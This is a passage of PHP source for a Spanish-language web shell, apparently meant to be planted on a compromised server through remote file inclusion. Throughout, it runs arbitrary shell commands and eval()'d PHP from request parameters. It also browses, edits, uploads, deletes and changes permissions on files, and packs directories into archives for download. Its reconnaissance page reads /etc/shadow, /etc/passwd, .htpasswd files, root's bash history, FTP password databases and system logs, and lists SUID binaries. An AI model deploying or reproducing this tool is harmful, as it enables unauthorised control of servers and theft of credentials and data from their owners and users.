        $functions[]=leerconfig('default_socket_timeout',' Default timeout (in seconds) for socket based streams.    Note: This configuration option was introduced in PHP 4.3.0 ');
        
        /* Mostramos el titulo */
        echo '<div style="text-align:center;">
        <a href="'.$rfiurl.'" class="sinsubrayado"><h1>'.$nombre.'</h1></a><br><br>
        </div>';
        
        /* Mostramos toda la información del array */
        foreach ($functions as $funcion){
            echo $funcion[0].' =&gt; '.$funcion[1].'<br>';
        }
    break;

    /* PHPInfo */
    case 'phpinfo':
        /* Mostramos el titulo */
        echo '<div style="text-align:center;">
        <a href="'.$rfiurl.'" class="sinsubrayado"><h1>'.$nombre.'</h1></a><br><br>
        </div>';
        
        /* All your phpinfo() are belog to us */
        ob_flush();
        ob_start();
            $disponible = phpinfo();
            $phpinfo = ob_get_clean();
            // Eliminamos un pedazo de html que agrega el phpinfo para que no quede duplicado
            $phpinfo = str_replace('</body></html>','',substr($phpinfo,strpos($phpinfo,'<body>')+6));
        ob_end_clean();
        echo ($disponible ? '<div id="phpinfo">'.$phpinfo : '<div class="n">phpinfo() no est&aacute; disponible.').'</div>';    
    break;

    /* Mas informacion */
    case 'info':
        /* Mostramos el titulo */
        echo '<div style="text-align:center;">
        <a href="'.$rfiurl.'" class="sinsubrayado"><h1>'.$nombre.'</h1></a><br><br>
        </div>';
        
        $ruta = getcwd() or '/';
        
        if((!ini_get('safe_mode')) or (strtolower(ini_get('safe_mode'))=='off')){
            $safemode = 'No';
        }else{
            $safemode = 'Si';
        } 
        
        echo 'Ubicaci&oacute;n: '.htmlentities(__FILE__, ENT_QUOTES, 'UTF-8').'<br>
        Libre: '.htmlentities(decode_size(disk_free_space($ruta)).' / '.decode_size(disk_total_space($ruta)), ENT_QUOTES, 'UTF-8').'<br>
        Safe_mode: '.$safemode.'<br>
        Funciones desactivadas: '.htmlentities(ini_get('disable_functions'), ENT_QUOTES, 'UTF-8').'<br>
        PHP: '.htmlentities(phpversion(), ENT_QUOTES, 'UTF-8').'<br>
        Zend: '.htmlentities(zend_version(), ENT_QUOTES, 'UTF-8').'<br>
        Extensiones cargadas: '.htmlentities(implode(', ',get_loaded_extensions()), ENT_QUOTES, 'UTF-8').'<br>
        <br>
        IP: '.htmlentities($_SERVER['SERVER_ADDR'], ENT_QUOTES, 'UTF-8').'<br>
        Puerto: '.htmlentities($_SERVER['SERVER_PORT'], ENT_QUOTES, 'UTF-8').'<br>
        Servidor: '.htmlentities($_SERVER['SERVER_NAME'], ENT_QUOTES, 'UTF-8').'<br>
        Software del servidor: '.htmlentities($_SERVER['SERVER_SOFTWARE'], ENT_QUOTES, 'UTF-8').'<br>
        Uname: '.htmlentities(php_uname(), ENT_QUOTES, 'UTF-8').'<br>
        <br>
        ';
        $usuarios = explode("\n",leer_archivo('/etc/passwd'));
        
/*Esta es la lista de cosas a mostrar
Si empieza con > es un titulo
Si empieza con < es un comando
Si no, es un archivo */
$comandos =
'><a href="'.$rfiurl.'w=shell&comando=find%20%2F%20-type%20f%20-perm%20-04000%20-ls ">Ver archivos con SUID</a>
><a href="'.$rfiurl.'w=shell&comando=find%20%2F%20-type%20f%20-perm%20-02000%20-ls ">Ver archivos con SGID</a>
>Memoria
<free -m
>Discos / Particiones
<df -h
<mount
/etc/fstab
>Ejecutables
<whereis curl
<whereis lynx
<whereis links
<whereis apache
<whereis php
<whereis ruby
<whereis mysql
<whereis wget
<whereis perl
<whereis python
<whereis gcc
<whereis apt-get
<whereis aptitude
<whereis yum
<whereis pacman
>Version
<sysctl -a | egrep "ostype |osrelease |version |hostname |domainname "|grep kernel.
/proc/version
/etc/issue.net
/etc/issue
/etc/motd
/etc/lsb-release
>Conexiones
<netstat -pa
>Hardware
/proc/cpuinfo
<dmidecode
>Logs
/root/.bash_history
'.archivosdeusuarios('/.bash_history').'
'.archivosdeusuarios('/public_html/.bash_history').'
/var/log/pure-ftpd/pure-ftpd.log
/logs/pure-ftpd.log
/var/log/pureftpd.log
/var/log/ftp-proxy/ftp-proxy.log
/var/log/ftp-proxy
/var/log/ftplog
/etc/logrotate.d/ftp
/etc/ftpchroot
/etc/ftphosts
/usr/lib/security/mkuser.default
/var/cpanel/accounting.log
/var/adm/SYSLOG
/var/adm/sulog
/var/adm/utmp
/var/adm/utmpx
/var/adm/wtmp
/var/adm/wtmpx
/var/adm/lastlog/username
/usr/spool/lp/log
/var/adm/lp/lpd-errs
/usr/lib/cron/log
/var/adm/loginlog
/var/adm/pacct
/var/adm/dtmp
/var/adm/acct/sum/loginlog
/var/adm/X0msgs
/var/adm/crash/vmcore
/var/adm/crash/unix
/var/adm/pacct
/var/adm/wtmp
/var/adm/dtmp
/var/adm/qacct
/var/adm/sulog
/var/adm/ras/errlog
/var/adm/ras/bootlog
/var/adm/cron/log
/etc/utmp
/etc/security/lastlog
/etc/security/failedlogin
/usr/spool/mqueue/syslog
/var/adm/messages
/var/adm/aculogs
/var/adm/aculog
/var/adm/sulog
/var/adm/vold.log
/var/adm/wtmp
/var/adm/wtmpx
/var/adm/utmp
/var/adm/utmpx
/var/adm/log/asppp.log
/var/log/syslog
/var/log/POPlog
/var/log/authlog
/var/adm/pacct
/var/lp/logs/lpsched
/var/lp/logs/lpNet
/var/lp/logs/requests
/var/cron/log
/var/saf/_log
/var/saf/port/log
/etc/httpd/logs/error.log
/etc/httpd/logs/error_log
/etc/httpd/logs/access.log
/etc/httpd/logs/access_log
/etc/wtmp
/etc/utmp
/opt/lampp/logs/error_log
/opt/lampp/logs/access_log
/var/log/lastlog
/var/log/telnetd
/var/run/utmp
/var/log/secure
/var/log/wtmp
/var/run/utmp
/var/log
/var/adm
/var/apache/log
/var/apache/logs
/var/apache/logs/access_log
/var/apache/logs/error_log
/var/log/acct
/var/log/apache/access.log
/var/log/apache/error.log
/var/log/apache-ssl/error.log
/var/log/apache-ssl/access.log
/var/log/auth.log
/var/log/xferlog
/var/log/message
/var/log/messages
/var/log/proftpd/xferlog.legacy
/var/log/proftpd.access_log
/var/log/proftpd.xferlog
/var/log/httpd/error_log
/var/log/httpd/access_log
/var/log/httpsd/ssl.access_log
/var/log/httpsd/ssl_log
/var/log/httpsd/ssl.access_log
/etc/mail/access
/var/log/qmail
/var/log/smtpd
/var/log/samba
/var/log/samba-log.%m
/var/lock/samba
/root/.Xauthority
/var/log/poplog
/var/log/news.all
/var/log/spooler
/var/log/news
/var/log/news/news
/var/log/news/news.all
/var/log/news/news.crit
/var/log/news/news.err
/var/log/news/news.notice
/var/log/news/suck.err
/var/log/news/suck.notice
/var/log/thttpd_log
/var/log/ncftpd/misclog.txt
/var/log/ncftpd.errs
/var/log/auth
/var/log/kern.log
/var/log/cron.log
/var/log/maillog
/var/log/qmail/
/var/log/httpd/
/var/log/lighttpd
/var/log/boot.log
/var/log/mysqld.log
/var/log/secure
/var/log/utmp
/var/log/wtmp
/var/log/yum.log
/var/spool/tmp
/var/spool/errors
/var/spool/logs
/var/spool/locks
/var/www/log/access_log
/var/www/log/error_log
/var/www/logs/access.log
/var/www/logs/error.log
/var/www/logs/error_log
/var/www/logs/access_log
/root/.ksh_history
/root/.bash_history
/usr/local/apache/log
/usr/local/apache/logs
/usr/local/apache/logs/access_log
/usr/local/apache/logs/error_log
/usr/local/apache/logs/access.log
/usr/local/apache/logs/error.log
/usr/local/etc/httpd/logs/access_log
/usr/local/etc/httpd/logs/error_log
/usr/local/www/logs/httpd_log
/opt/lampp/logs/access_log
/opt/lampp/logs/error_log
>Usuarios
<id
'.archivosdeusuarios('/.bashrc').'
'.archivosdeusuarios('/public_html/.bashrc').'
/root/.bashrc
/root/.bash_logut
/etc/security/group
/etc/security/passwd
/etc/security/user
/etc/security/environ
/etc/security/limits
/etc/passwd
/etc/shadow
/etc/group
./.htasswd
../.htpasswd
'.archivosdeusuarios('/public_html/.htpasswd').'
>Configuraci&oacute;n
/etc/apt/sources.list
/etc/hosts
./.htaccess
../.htaccess
../../.htaccess
../../../.htaccess
'.archivosdeusuarios('/public_html/.htaccess').'
/opt/lampp/etc/httpd.conf
/opt/lampp/etc/my.cnf
/opt/lampp/etc/php.ini
/etc/syslog.conf
/etc/named.conf
/etc/httpd/conf/httpd.conf
/etc/php.ini
/usr/lib/php.ini
/usr/local/lib/php.ini
'.archivosdeusuarios('/public_html/php.ini').'
/etc/httpd.conf
/etc/pure-ftpd.conf
/etc/pure-ftpd/pure-ftpd.pdb
/etc/pureftpd.pdb
/etc/pureftpd.passwd
/etc/pure-ftpd/pureftpd.pdb
psybnc.conf
>Otros
/etc/userdomains
<dmesg';
       
        $comandos = explode("\n",$comandos);        //armamos un array con todos los comandos, titulos y archivos
        foreach ($comandos as $comando){ 
            if (substr($comando,0,1)=='>'){     //si empieza con > es un titulo
                echo '<br><h1>'.substr($comando,1).'</h1>';
            }elseif (substr($comando,0,1)=='<'){        //si empieza con < es un comando
                $resultado = shell(substr($comando,1), false);
                $lineas = substr_count($resultado,"\n");
                if ($lineas>15){ $lineas = 15; }        //el maximo de lineas del textarea es 15
                //mostramos el div y el textarea con el resultado
                if ($resultado!=false){ echo '<div class="s">'.htmlentities(substr($comando,1), ENT_QUOTES, 'UTF-8').':</div><textarea style="width:100%;" rows="'.$lineas.'">'.htmlentities($resultado,ENT_QUOTES, 'UTF-8').'</textarea><br><br>'; } 
            }else{      //es un archivo, llamamos a la funcion que lo muestra en un textarea
                mostrar_archivo($comando);
            }
        }
        
    break;

    /* Ejecutar comandos */
    case 'shell':
        /* Mostramos el titulo */
        echo '<div style="text-align:center;">
        <a href="'.$rfiurl.'" class="sinsubrayado"><h1>'.$nombre.'</h1></a><br><br>
        </div>';
        
        $ruta = $_REQUEST['ruta'];
        if (!$ruta){
            $ruta = getcwd();
        }else{
            chdir($ruta);
        }
        
        if (isset($_REQUEST['comando'])){
            $cmd = $_REQUEST['comando'];
            $salida = shell($cmd);
            //$salida[0] es el resultado y $salida[1] es de que forma se ejecutó el comando
            if (!$salida){ $salida[0]='Imposible de ejecutar'; $salida[1]='Modo: ninguno';}

            $salida[0]=htmlentities($salida[0], ENT_QUOTES, 'UTF-8'); //El resultado
            $salida[1]=htmlentities($salida[1], ENT_QUOTES, 'UTF-8'); //Como se ejecutó
            $lineas=substr_count($salida[0],"\n")+1;   //el largo del textarea
            if ($lineas>25) $lineas = 25;
            echo $salida[1].'<br><textarea style="width:100%;" rows="'.$lineas.'">'.$salida[0].'</textarea>';
        }
        /* Mostramos el formulario donde se ingresa el comando */
        echo '<form action="'.$rfiurl.'w=shell" method="post" style="width:100%;"><div style="width:100%;">
        Directorio:&nbsp;<input type="text" style="width:75%; align:left;" name="ruta" value="'.htmlentities($ruta,ENT_QUOTES, 'UTF-8').'"><br>
        Comando:&nbsp;&nbsp;&nbsp;&nbsp;<input type="text" style="width:75%; align:left;" name="comando" value="'.htmlentities($cmd, ENT_QUOTES, 'UTF-8').'">
        <input type="submit" style="width:17%; float:right;" value="Ejecutar"></div>
        </form>';
    break;

    /* Ejecutar php */
    case 'php':
        /* Mostramos el titulo */
        echo '<div style="text-align:center;">
        <a href="'.$rfiurl.'" class="sinsubrayado"><h1>'.$nombre.'</h1></a><br><br>
        </div>';
        
        $ruta = $_REQUEST['ruta'];
        if (!$ruta){
            $ruta = getcwd();
        }else{
            chdir($ruta);
        }
        
        if (isset($_POST['codigo'])){
            $cmd = $_POST['codigo'];
            ob_flush();
            ob_start();
                eval($cmd);
                $salida = ob_get_clean();
            ob_end_clean();
            
            if ($_POST['textarea']){        ///va el textarea alrededor del resultado?
                $textarea0='<textarea style="width:100%; height:200px; align:left;">';
                $textarea1='</textarea>';
            }
            $salida = 'Resultado:<br>'.$textarea0.htmlentities($salida, ENT_QUOTES, 'UTF-8').$textarea1.'<br><br>';
        }
        /* Mostramos el formulario donde se ingresa el codigo */
        echo '<form action="'.$rfiurl.'w=php&ruta='.htmlentities($ruta,ENT_QUOTES,'UTF-8').'" method="post">
        '.$salida.'
        C&oacute;digo:<br><textarea style="width:100%; height:200px;" name="codigo">'.htmlentities($cmd, ENT_QUOTES, 'UTF-8').'</textarea><br><br>
        <div style="text-align:right;"><input type="checkbox" name="textarea" checked>Mostrar en textarea <input type="submit" style="width:17%;" value="Ejecutar"></div>
        </form>';
    break;
    
    /* Navegador de archivos */
    case 'archivos':
        /* Mostramos el titulo */
        echo '<div style="text-align:center;">
        <a href="'.$rfiurl.'" class="sinsubrayado"><h1>'.$nombre.'</h1></a><br><br>
        </div>';
        
        $ruta = $_REQUEST['ruta'];
        if (!$ruta){
            $ruta = getcwd();
        }
        
        //el espacio libre y total en el hd
        $espacio = '<div class="center" style="font-weight:bold;">'.decode_size(disk_free_space($ruta)).' / '.decode_size(disk_total_space($ruta)).'</div>';
        
        //mostramos el formulario para cambiar de directorio
        echo '
        <form action="'.$rfiurl.'w=archivos" method="POST">
            <input style="width:85%;float:left;" type="text" name="ruta" value="'.htmlentities($ruta,ENT_QUOTES,'UTF-8').'">
            <input type="submit" value="Ir" style="width:10%;float:right;">
        </form><br><br>'.$espacio.'<br>
        <table>';
        
        if(!chdir($ruta)){
            echo '<div class="n" style="font-size:150%;">Ruta inv&aacute;lida</div>';
        }else{
            $ruta = getcwd();
            
            //leemos los directorios
            $handledirectorios = opendir($ruta);
            rewinddir($handledirectorios);
            while (false !== ($archivos[] = readdir($handledirectorios))){} //WTF? me gustaria saber por que lo hago asi
            
            //lo ordenamos alfabeticamente
            sort($archivos,SORT_STRING);
            unset($archivos[0]);
            
            //las tres primeras filas
            echo '<tr><td class="ac"><img src="'.$rfiurl.'w=img&imagen=archivonuevo" class="ai" alt="Archivo nuevo"></td>
                    <td style="text-align:left;font-size:0px;" colspan="5">
                    <form action="'.$rfiurl.'w=subir" method="POST" enctype="multipart/form-data">
                        <input name="ruta" type="hidden" value="'.htmlentities($ruta,ENT_QUOTES,'UTF-8').'/">
                        <input name="ruta2" type="file" style="width:70%;" />
                        <input type="submit" value="Crear archivo" style="width:20%; float:right;" />
                    </form></td></tr>
                <tr><td class="ac"><img src="'.$rfiurl.'w=img&imagen=archivonuevo" class="ai" alt="Archivo nuevo"></td>
                    <td style="text-align:left;font-size:0px;" colspan="5">
                    <form action="'.$rfiurl.'w=editar" method="POST">
                        <input name="ruta" type="hidden" value="'.htmlentities($ruta,ENT_QUOTES,'UTF-8').'/">
                        <input name="ruta2" style="width:70%;" value="archivo.txt">
                        <input type="submit" value="Crear archivo" style="width:20%; float:right;">
                    </form></td></tr>
                <tr><td class="ac"><img src="'.$rfiurl.'w=img&imagen=carpetanueva" class="ai" alt="Carpeta nuevo"></td>
                <td style="text-align:left;font-size:0px;" colspan="5">
                <form action="'.$rfiurl.'w=nuevacarpeta" method="POST">
                    <input name="ruta" type="hidden" value="'.htmlentities($ruta,ENT_QUOTES,'UTF-8').'/">
                    <input name="ruta2" style="width:70%;" value="carpeta">
                    <input type="submit" value="Crear carpeta" style="width:20%; float:right;">
                </form></td></tr>';
            
            //mostramos el link a todos los archivos
            foreach($archivos as $archivo){
                echo mostrar_link($ruta,$archivo);
            }
            closedir($handledirectorios);
        }
        echo '</table>';
        
    break;

    /* Editor de archivos */
    case 'editar':
        /* Mostramos el titulo */
        echo '<div style="text-align:center;">
        <a href="'.$rfiurl.'" class="sinsubrayado"><h1>'.$nombre.'</h1></a><br><br>
        </div>';
        
        $ruta=$_REQUEST['ruta'].$_REQUEST['ruta2'];
        //mostramos el form 
        echo '
            <form action="'.$rfiurl.'w=editar" method="POST" name="editar" default="">
                <input style="width:80%;float:left;" type="text" name="ruta" value="'.htmlentities($ruta,ENT_QUOTES,'UTF-8').'">
                <input type="hidden" name="accion" value="enter">
                <input type="button" value="Guardar" style="width:7%;float:right;" onclick="editar.accion.value=/Guardar/.source;editar.submit()">
                <input type="button" value="Abrir" style="width:7%;float:right;" onclick="editar.accion.value=/Abrir/.source;editar.submit()">
                <br />
            ';
            
        switch($_POST['accion']) {
            
            //escribimos el archivo
            case 'Guardar':
                if(($ruta!=='') and isset($ruta)){
                    $contenido = $_POST['contenido'];
                    $resultado = escribir_archivo($ruta,$contenido);
                    if ($resultado===FALSE){
                        echo '<br><div class="n">Sin permisos de escritura o todas las funciones desactivadas</div>';
                    }
                }
            
            //no hay break a proposito, porque despues de escribir el archivo lo quiero leer para comprobar que esté bien guardado
            //leemos el archivo
            case 'Abrir':
            default:
                if ( file_exists($ruta) and (($archivo=leer_archivo($ruta))!==FALSE) ) {
                    $perm = permisos($ruta);
                    //ponemos los colores de los permisos
                    if (is_writable($ruta)){
                        $colorpermisos = '#8ABD22';
                    }else{
                        $colorpermisos = '#CD2626';
                    }
                    //mostramos el dueño del archivo
                    $data = posix_getpwuid(fileowner($ruta));
                    $usuario = $data['name'];
                    $data = posix_getgrgid(filegroup($ruta));
                    $usuario.= ':'.$data['name'];
                    
                    echo '<br><div style="display:inline;color:'.$colorpermisos.'">('.$perm.')</div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Due&ntilde;o: '.$usuario.'&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Modificado: '.date('d/m/Y H:i',filectime($ruta));
                    
                }else{
                    if(($ruta!=='') and isset($ruta) and !isset($_REQUEST['ruta2'])){
                        echo '<br><div class="n">Archivo inexistente, sin permisos de lectura o todas las funciones desactivadas</div>';
                    }
                }
                
                break;
                
            case 'enter':
                $archivo = $_POST['contenido'];
                $perm = permisos($ruta);
                //ponemos los colores de los permisos
                if (is_writable($ruta)){
                    $colorpermisos = '#8ABD22';
                }else{
                    $colorpermisos = '#CD2626';
                }
                //mostramos el dueño del archivo
                $data = posix_getpwuid(fileowner($ruta));
                $usuario = $data['name'];
                $data = posix_getgrgid(filegroup($ruta));
                $usuario.= ':'.$data['name'];
                
                echo '<br><div style="display:inline;color:'.$colorpermisos.'">('.$perm.')</div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Due&ntilde;o: '.$usuario.'&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;Modificado: '.date('d/m/Y H:i',filectime($ruta));
                break;
        }
     
        //mostramos el textarea
        echo '
        <br>
            <textarea style="width:100%; height:300px;" name="contenido">'.htmlentities($archivo,ENT_QUOTES,'UTF-8').'</textarea><br><br>
        </form>';
        
    break;

    /* Eliminar archivos */
    case 'eliminar':
        /* Mostramos el titulo */
        echo '<div style="text-align:center;">
        <a href="'.$rfiurl.'" class="sinsubrayado"><h1>'.$nombre.'</h1></a><br><br>
        </div>';
        
        if (isset($_REQUEST['ruta']) and ($_REQUEST['ruta']!='')){
            if (substr($_REQUEST['ruta'],-2)=='/.') $_REQUEST['ruta'] = substr($_REQUEST['ruta'],0,-1);
            borrar($_REQUEST['ruta']);
            if(!file_exists($_REQUEST['ruta'])){
                echo '<div class="s center">&quot;'.htmlentities($_REQUEST['ruta'],ENT_QUOTES,'UTF-8').'&quot; fue eliminado</div><br><br>';
            }else{
                echo '<div class="n center">Error eliminando &quot;'.htmlentities($_REQUEST['ruta'],ENT_QUOTES,'UTF-8').'&quot;</div><br><br>';
            }
        }else{
            echo '<script>document.location="'.$rfiurl.'w=archivos"</script>';
        }
        echo '<div class="center"><a href="'.$rfiurl.'">Ir al principio</a> | <a href="'.$rfiurl.'w=archivos&ruta='.htmlentities(dirname($_REQUEST['ruta']),ENT_QUOTES,'UTF-8').'">Volver al navegador de archivos</a></div>';
    break;

    /* Para crear una carpeta desde el navegador de archivos */
    case 'nuevacarpeta':
        /* Mostramos el titulo */
        echo '<div style="text-align:center;">
        <a href="'.$rfiurl.'" class="sinsubrayado"><h1>'.$nombre.'</h1></a><br><br>
        </div>';
        
        $ruta=$_REQUEST['ruta'].$_REQUEST['ruta2'];
        if (isset($ruta) and ($ruta!='')){
            if(mkdir($ruta)){
                echo '<div class="s center">&quot;'.htmlentities($ruta,ENT_QUOTES,'UTF-8').'&quot; fue creado</div><br><br>';
            }else{
                echo '<div class="n center">Error creando &quot;'.htmlentities($ruta,ENT_QUOTES,'UTF-8').'&quot;</div><br><br>';
            }
        }else{
            echo '<script>document.location="'.$rfiurl.'w=archivos"</script>';
        }
        echo '<div class="center"><a href="'.$rfiurl.'">Ir al principio</a> | <a href="'.$rfiurl.'w=archivos&ruta='.htmlentities($_REQUEST['ruta'],ENT_QUOTES,'UTF-8').'">Volver al navegador de archivos</a></div>';
    break;

    /* Para subir archivos */
    case 'subir':
        /* Mostramos el titulo */
        echo '<div style="text-align:center;">
        <a href="'.$rfiurl.'" class="sinsubrayado"><h1>'.$nombre.'</h1></a><br><br>
        </div>';

        $ruta = $_POST['ruta'];
        $subio = false;
        if (isset($ruta) and ($ruta!='')){
            //esto podria ser un solo if, pero asi es mas facil de debuggear
            if (is_uploaded_file($HTTP_POST_FILES['ruta2']['tmp_name'])) {
                if(move_uploaded_file($HTTP_POST_FILES['ruta2']['tmp_name'], $ruta.$HTTP_POST_FILES['ruta2']['name'])){
                    $subio = true;
                }elseif(copy($HTTP_POST_FILES['ruta2']['tmp_name'], $ruta.$HTTP_POST_FILES['ruta2']['name'])){
                    $subio = true;
                }elseif((($archivo=leer_archivo($HTTP_POST_FILES['ruta2']['tmp_name']))!==false) and (escribir_archivo($ruta.$HTTP_POST_FILES['ruta2']['name'],$archivo)!==false)){
                    $subio = true;
                }
            }
            
            if($subio){
                echo '<div class="s center">&quot;'.htmlentities($ruta.$HTTP_POST_FILES['ruta2']['name'],ENT_QUOTES,'UTF-8').'&quot; fue creado</div><br><br>';
            }else{
                echo '<div class="n center">Error creando &quot;'.htmlentities($ruta.$HTTP_POST_FILES['ruta2']['name'],ENT_QUOTES,'UTF-8').'&quot;</div><br><br>';
            }
        }else{
            echo '<script>document.location="'.$rfiurl.'w=archivos"</script>';
        }
        echo '<div class="center"><a href="'.$rfiurl.'">Ir al principio</a> | <a href="'.$rfiurl.'w=archivos&ruta='.htmlentities($_POST['ruta'],ENT_QUOTES,'UTF-8').'">Volver al navegador de archivos</a></div>';
    break;

    /* Para chmod, chown y chgrp */
    case 'chmod':
    /* Mostramos el titulo */
        echo '<div style="text-align:center;">
        <a href="'.$rfiurl.'" class="sinsubrayado"><h1>'.$nombre.'</h1></a><br><br>
        </div>';
        
        $ruta = $_REQUEST['ruta'];
        $chmod = $_POST['chmod'];
        $chgrp = $_POST['chgrp'];
        $chown = $_POST['chown'];
        $chmod_dec = octdec('0'.$chmod);        //chmod() de php necesita que esté en octal
        
        
        if (isset($ruta) and file_exists($ruta)){
            
            //sacamos usuario y grupo dueños del archivo
            $data = posix_getpwuid(fileowner($ruta.$barra.$archivo));
            $usuarioarchivo = $data['name'];
            $data = posix_getgrgid(filegroup($ruta.$barra.$archivo));
            $grupoarchivo = $data['name'];
            
            if (isset($chmod) and ($chmod != '') and ($chmod != substr(sprintf('%o', fileperms($ruta)), -4))){      //si estas cambiando los permisos
                if(chmod($ruta,$chmod_dec) or shell('chmod '.escapeshellarg($chmod).' '.escapeshellarg($ruta), false))      //probamos con chmod() y chmod de unix
                    echo '<div class="s center">Permisos asignados</div>';
                else{
                    echo '<div class="n center">Imposible cambiar permisos</div><br><br>';
                }
            }
            if (isset($chgrp) and ($chgrp != '') and ($chgrp != $grupoarchivo)){        //si estas cambiando el grupo
                if(chgrp($ruta,$chgrp) or shell('chgrp '.escapeshellarg($chgrp).' '.escapeshellarg($ruta), false))
                    echo '<div class="s center">Grupo cambiado</div>';
                else{
                    echo '<div class="n center">Imposible cambiar el grupo</div><br><br>';
                }
            }
            if (isset($chown) and ($chown != '') and ($chown != $usuarioarchivo)){      //si estas cambiando el usuario
                if(chown($ruta,$chown) or shell('chgrp '.escapeshellarg($chown).' '.escapeshellarg($ruta), false))
                    echo '<div class="s center">Due&ntilde;o cambiado</div>';
                else{
                    echo '<div class="n center">Imposible cambiar el due&ntilde;o</div><br><br>';
                }
            }           
            
          
            //sacamos la lista de grupos y la mostramos
            if($grupos = explode("\n",leer_archivo('/etc/group'))){
                $listagrupos = '<select style="width:100%;" name="chgrp">'."\n";
                foreach ($grupos as $grupo){
                    if ($nombregrupo = substr($grupo,0,strpos($grupo,':'))){
                        if($nombregrupo == $grupoarchivo){
                            $listagrupos.= '<option selected="selected">'.$nombregrupo.'</option>'."\n";
                        }else{
                            $listagrupos.= '<option>'.$nombregrupo.'</option>'."\n";
                        }
                    }
                }
                $listagrupos.= '</select>'."\n";
            }else{
                $listagrupos = '<input type="text" style="width:100%;" name="chgrp" value="'.htmlentities($grupoarchivo ,ENT_QUOTES,'UTF-8').'">';
            }
            
            //sacamos la lista de usuarios y la mostramos
            if($usuarios = explode("\n",leer_archivo('/etc/passwd'))){
                $listausuarios = '<select name="chown" style="width:100%;">'."\n";
                foreach ($usuarios as $usuario){
                    if ($nombreusuario = substr($usuario,0,strpos($usuario,':'))){
                        if($nombreusuario == $usuarioarchivo){
                            $listausuarios.= '<option selected="selected">'.$nombreusuario.'</option>'."\n";
                        }else{
                            $listausuarios.= '<option>'.$nombreusuario.'</option>'."\n";
                        }
                    }
                }
                $listausuarios.= '</select style="width:100%;">'."\n";
            }else{
                $listausuarios = '<input type="text" style="width:100%;" name="chown" value="'.htmlentities($usuarioarchivo ,ENT_QUOTES,'UTF-8').'">';
            }
            
            //mostramos el formulario
            echo '
            <form action="'.$rfiurl.'w=chmod" method="POST"><table style="text-align: right;">
            <tr><td>Archivo:</td><td><input type="text" style="width:100%;" name="ruta" value="'.htmlentities($ruta ,ENT_QUOTES,'UTF-8').'"></td></tr>
            <tr><td>Permisos:</td><td><input type="text" style="width:100%;" name="chmod" value="'.htmlentities(substr(sprintf('%o', fileperms($ruta)), -4),ENT_QUOTES,'UTF-8').'"></td></tr>
            <tr><td>Due&ntilde;o:</td><td>'.$listausuarios.'</td></tr>
            <tr><td>Grupo:</td><td>'.$listagrupos.'</td></tr>
            <tr><td border="0"></td><td><input type="submit" value="cambiar" style="width:100%;"></td></tr>
            </table></form>
            ';
            
        }else{
            echo '<div class="n center">Archivo no existente</div><br><br>';
        }
        
        echo '<div class="center"><a href="'.$rfiurl.'">Ir al principio</a> | <a href="'.$rfiurl.'w=archivos&ruta='.htmlentities(dirname($ruta),ENT_QUOTES,'UTF-8').'">Volver al navegador de archivos</a></div>';
    break;

    /* Mover y copiar archivos y carpetas */
    case 'copiar':
        echo '<div style="text-align:center;">
        <a href="'.$rfiurl.'" class="sinsubrayado"><h1>'.$nombre.'</h1></a><br><br>
        </div>';
        
        $rutaOrigen = $_REQUEST['origen'];
        $rutaDestino = $_REQUEST['destino'];
        
            //mostramos el formulario
            echo '
            <form action="'.$rfiurl.'w=copiar" method="post"><table style="text-align: right;">
            <tr><td>Origen:</td><td><input type="text" style="width:100%;" name="origen" value="'.htmlentities($rutaOrigen ,ENT_QUOTES,'UTF-8').'"></td></tr>
            <tr><td>Destino:</td><td><input type="text" style="width:100%;" name="destino" value="'.htmlentities($rutaDestino,ENT_QUOTES,'UTF-8').'"></td></tr>
            <tr><td border="0"></td><td><input type="submit" value="Mover" name="action" style="width:100%;"><br><input type="submit" value="Copiar" name="action" style="width:100%;"></td></tr>
            </table></form>
            ';
        
        if(isset($rutaOrigen) and isset($rutaDestino)){
            if ($_POST['action']=='Copiar'){
                if(copiar_recursivo($rutaOrigen,$rutaDestino)){
                    echo '<div class="s center">'.htmlentities($rutaOrigen,ENT_QUOTES,'UTF-8').' fue copiado a '.htmlentities($rutaDestino,ENT_QUOTES,'UTF-8').'</div>';
                }else{
                    echo '<div class="n center">No se pudo copiar '.htmlentities($rutaOrigen,ENT_QUOTES,'UTF-8').' a '.htmlentities($rutaDestino,ENT_QUOTES,'UTF-8').'</div>';
                }
                echo '<div class="center"><a href="'.$rfiurl.'">Ir al principio</a> | <a href="'.$rfiurl.'w=archivos&ruta='.htmlentities(dirname($rutaOrigen),ENT_QUOTES,'UTF-8').'">Volver al navegador de archivos</a></div>';
            }elseif($_POST['action']=='Mover'){
                if(rename($rutaOrigen,$rutaDestino)){
                    echo '<div class="s center">'.htmlentities($rutaOrigen,ENT_QUOTES,'UTF-8').' fue movido a '.htmlentities($rutaDestino,ENT_QUOTES,'UTF-8').'</div>';
                }else{
                    echo '<div class="n center">No se pudo mover '.htmlentities($rutaOrigen,ENT_QUOTES,'UTF-8').' a '.htmlentities($rutaDestino,ENT_QUOTES,'UTF-8').'</div>';
                }
                echo '<div class="center"><a href="'.$rfiurl.'">Ir al principio</a> | <a href="'.$rfiurl.'w=archivos&ruta='.htmlentities(dirname($rutaOrigen),ENT_QUOTES,'UTF-8').'">Volver al navegador de archivos</a></div>';
            }
        }
    break;

    /* Comprimir directorios */
    case 'comprimir':
        $ruta = realpath($_GET['ruta']);
        if ( shell('tar czf ' . escapeshellarg('/tmp/'.basename($ruta).'.tar.gz') . ' '.escapeshellarg($ruta)) ){
            echo '<iframe style="display: none;" src="'.$rfiurl.'w=descargar&borrar=1&ruta='.urlencode('/tmp/'.basename($ruta).'.tar.gz').'">';
            echo '<a href="'.$rfiurl.'w=descargar&borrar=1&ruta='.urlencode('/tmp/'.basename($ruta).'.tar.gz').'">Descargar y borrar</a>';
            echo '</iframe>';
        }else{
            echo '<div class="n center">Error! Capaz no se puede ejecutar tar o escribir en /tmp. Probá a mano.</div><br />';
        }
        echo '<div class="center"><a href="'.$rfiurl.'">Ir al principio</a> | <a href="'.$rfiurl.'w=archivos&ruta='.htmlentities(dirname($ruta),ENT_QUOTES,'UTF-8').'">Volver al navegador de archivos</a></div>';
    break;

    /* Enviar emails */
    case 'mail':
        /* Mostramos el titulo */
        echo '<div style="text-align:center;">
        <a href="'.$rfiurl.'" class="sinsubrayado"><h1>'.$nombre.'</h1></a><br><br>
        </div>';
        
        if(isset($_POST['to']) and isset($_POST['subject']) and isset($_POST['message'])){          //Estos son los datos obligatorios para mandar un email
